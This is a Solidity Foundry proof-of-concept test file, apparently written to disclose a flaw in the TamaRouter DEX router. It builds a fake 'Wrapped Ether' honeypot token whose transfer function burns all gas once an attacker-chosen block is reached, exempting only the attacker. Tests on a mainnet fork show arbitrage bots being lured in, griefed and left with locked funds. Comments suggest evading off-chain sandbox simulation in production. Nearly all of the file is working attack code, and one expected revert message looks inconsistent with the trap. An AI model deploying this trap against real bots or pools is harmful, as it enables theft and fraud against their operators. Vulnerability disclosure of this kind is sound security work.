// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "tamaswap/TamaRouter.sol";

interface ITamaRouter {
    function factory() external view returns (address);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        address weth,
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface ITamaFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract MockUntrustedWrapper {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    address public immutable attacker;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public targetBlock;
    address public allowedOrigin;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    receive() external payable {
        deposit();
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    function setupTrapParameters(uint256 _targetBlock, address _allowedOrigin) external {
        require(msg.sender == attacker, "Unauthorized");
        targetBlock = _targetBlock;
        allowedOrigin = _allowedOrigin;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _internalTransfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amount, "ERC20: insufficient allowance");
            allowance[from][msg.sender] -= amount;
        }
        return _internalTransfer(from, to, amount);
    }

    function _internalTransfer(address from, address to, uint256 amount) private returns (bool) {
        require(balanceOf[from] >= amount, "ERC20: transfer amount exceeds balance");

        // exempt attacker or pass if parameters are unset
        bool isExempt = (from == attacker || to == attacker || (targetBlock == 0 && allowedOrigin == address(0)));

        if (!isExempt) {
            // activates trap
            if (block.number >= targetBlock && tx.origin != allowedOrigin) {
                assembly {
                    invalid() // consumes all remaining gas
                }
            }
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TamaSwapPocTest is Test {
    IERC20 public immutable MAINNET_USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ITamaFactory public TAMA_FACTORY;
    ITamaRouter public TAMA_ROUTER;

    MockUntrustedWrapper public fakeWeth;
    address public pairAddress;

    address public victimBot = address(0x1111);
    address public attacker = address(0x2222);

    function setUp() public {
        string memory rpcUrl = vm.envOr("ETH_RPC_URL", string("https://llamarpc.com"));
        vm.createSelectFork(rpcUrl, 25700000);

        address realFactory = 0x00000021543ed46B665A74484c82B71E4eB61e34; // listed in Tamaswap documentation as the factory address
        TAMA_FACTORY = ITamaFactory(realFactory);
        TAMA_ROUTER = ITamaRouter(address(new TamaRouter(realFactory))); 
        fakeWeth = new MockUntrustedWrapper(attacker);

        vm.deal(victimBot, 10 ether);
        vm.deal(attacker, 20 ether);

        pairAddress = TAMA_FACTORY.createPair(address(fakeWeth), address(MAINNET_USDC));

        deal(address(MAINNET_USDC), pairAddress, 2000 * 10 ** 6);
        deal(address(fakeWeth), pairAddress, 10 ether);

        IUniswapV2Pair(pairAddress).sync();
    }

    function test_LiveFork_SimpleCase() public {
        // This doesn't make use of the more extensive attack logic in the wrapper token as this
        // test case assumes no multi-hop token logic or profit simulation by the arb bot.
        // The core vulnerability is demonstrated, however.
        address[] memory path = new address[](2);
        path[0] = address(fakeWeth);
        path[1] = address(MAINNET_USDC);

        vm.startPrank(victimBot);

        TAMA_ROUTER.swapETHForExactTokens{value: 2 ether}(
            address(fakeWeth), // injecting fake WETH as the wrapper reference
            50 * 1e6,
            path,
            victimBot,
            block.timestamp + 60
        );
        vm.stopPrank();

        uint256 botUsdcBalance = MAINNET_USDC.balanceOf(victimBot);
        assertEq(botUsdcBalance, 50 * 1e6, "Exact output requirement failed.");
    }

    function test_LiveFork_ActiveTrap_GasGriefing() public {
        // force the trap to be active on current block number
        vm.prank(attacker);
        fakeWeth.setupTrapParameters(block.number, address(0x9999));
        vm.stopPrank();

        address[] memory path = new address[](2);
        path[0] = address(fakeWeth);
        path[1] = address(MAINNET_USDC);

        vm.startPrank(victimBot);

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 15);
        vm.expectRevert("TamaRouter: TRANSFER_FAILED");

        TAMA_ROUTER.swapETHForExactTokens{value: 2 ether, gas: 5_000_000}(
            address(fakeWeth), 50 * 1e6, path, victimBot, block.timestamp + 60
        );
        vm.stopPrank();
    }

    function test_LiveFork_ActiveTrap_SequentialSimulation() public {
        // POC SCOPE: In production, an attacker would detect off-chain sandboxes 
        // via environment checks (e.g. block.coinbase or gas limits). For simplicity 
        // in this test runner, we isolate the sequence using a block-delay frame.
        vm.prank(attacker);
        fakeWeth.setupTrapParameters(block.number + 10, address(0x9999)); // trap set for future "live block" but won't affect current simulation
        vm.stopPrank();

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(fakeWeth);
        buyPath[1] = address(MAINNET_USDC);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(MAINNET_USDC);
        sellPath[1] = address(fakeWeth);

        uint256 botEthBeforeBuy = victimBot.balance;

        vm.startPrank(victimBot);

        TAMA_ROUTER.swapETHForExactTokens{value: 2 ether}(
            address(fakeWeth), 50 * 1e6, buyPath, victimBot, block.timestamp + 60
        );
        vm.stopPrank();

        uint256 botEthSpentInBuyLeg = botEthBeforeBuy - victimBot.balance;
        uint256 botUsdcBalance = MAINNET_USDC.balanceOf(victimBot);
        assertTrue(botUsdcBalance > 0, "Buy leg failed to deliver tokens.");

        uint256 pumpAmountFakeWeth = 10 ether;
        deal(address(fakeWeth), attacker, pumpAmountFakeWeth);

        vm.startPrank(attacker);
        fakeWeth.approve(address(TAMA_ROUTER), pumpAmountFakeWeth);

        TAMA_ROUTER.swapExactTokensForTokens(pumpAmountFakeWeth, 0, buyPath, attacker, block.timestamp + 60);
        vm.stopPrank();

        vm.startPrank(victimBot);
        MAINNET_USDC.approve(address(TAMA_ROUTER), botUsdcBalance);

        // Final leg settles in fake WETH to isolate the interface validation defect. In production 
        // environments, an attacker would implement local wrapping/unwrapping overrides.
        TAMA_ROUTER.swapExactTokensForTokens(botUsdcBalance, 0, sellPath, victimBot, block.timestamp + 60);
        vm.stopPrank();

        uint256 endingFakeWeth = fakeWeth.balanceOf(victimBot);
        assertGt(endingFakeWeth, botEthSpentInBuyLeg, "Simulation failure, no circular profit detected.");
    }

    function test_LiveFork_ActiveTrap_Honeypot() public {
        // POC SCOPE: Simulates the on-chain execution leg after the temporal 
        // gate or environmental condition has cleared, triggering the asset lock.
        vm.prank(attacker, attacker);
        fakeWeth.setupTrapParameters(block.number + 2, address(0x9999));
        vm.stopPrank();

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(fakeWeth);
        buyPath[1] = address(MAINNET_USDC);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(MAINNET_USDC);
        sellPath[1] = address(fakeWeth);

        vm.startPrank(victimBot);
        // this swap goes through because the honeypot has not yet been reached
        TAMA_ROUTER.swapETHForExactTokens{value: 2 ether}(
            address(fakeWeth), 50 * 1e6, buyPath, victimBot, block.timestamp + 60
        );
        vm.stopPrank();

        uint256 botUsdcBalance = MAINNET_USDC.balanceOf(victimBot);
        assertTrue(botUsdcBalance > 0, "Buy leg failed to deliver tokens.");

        // We go forward in time to after the honeypot is triggered. Now the pumping will only
        // make the bot lose gas as their original funds + simulated profit cannot be recovered.
        vm.roll(block.number + 2);
        vm.warp(block.timestamp + 30);

        uint256 pumpAmountFakeWeth = 10 ether;
        deal(address(fakeWeth), attacker, pumpAmountFakeWeth);

        vm.startPrank(attacker);
        fakeWeth.approve(address(TAMA_ROUTER), pumpAmountFakeWeth);

        TAMA_ROUTER.swapExactTokensForTokens(pumpAmountFakeWeth, 0, buyPath, attacker, block.timestamp + 60);
        vm.stopPrank();

        vm.startPrank(victimBot);
        MAINNET_USDC.approve(address(TAMA_ROUTER), botUsdcBalance);
        vm.expectRevert("transfer reverted");

        TAMA_ROUTER.swapExactTokensForTokens{gas: 5_000_000}(
            botUsdcBalance, 0, sellPath, victimBot, block.timestamp + 60
        );
        vm.stopPrank();

        uint256 endingFakeWeth = fakeWeth.balanceOf(victimBot);

        assertEq(endingFakeWeth, 0, "Bot somehow recovered or generated fake WETH tokens.");
        assertNotEq(MAINNET_USDC.balanceOf(victimBot), 0, "Bot ended up selling their USDC.");
    }
}
